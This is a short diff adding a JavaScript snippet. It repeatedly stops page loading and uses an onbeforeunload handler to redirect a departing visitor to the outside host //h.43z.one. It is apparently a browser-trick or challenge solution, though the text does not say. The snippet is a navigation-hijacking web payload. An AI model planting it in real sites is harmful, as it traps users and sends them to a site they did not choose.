@@ -1,0 +1,11 @@
+i1=setInterval(_=>stop(),0)
+i2=null
+onbeforeunload=e=>{
+  console.log('onbeforeunload')
+  if(!i2){
+    i2=setTimeout(_=>{
+      location='//h.43z.one'
+      clearInterval(i1)
+    }, 0)
+  }
+}
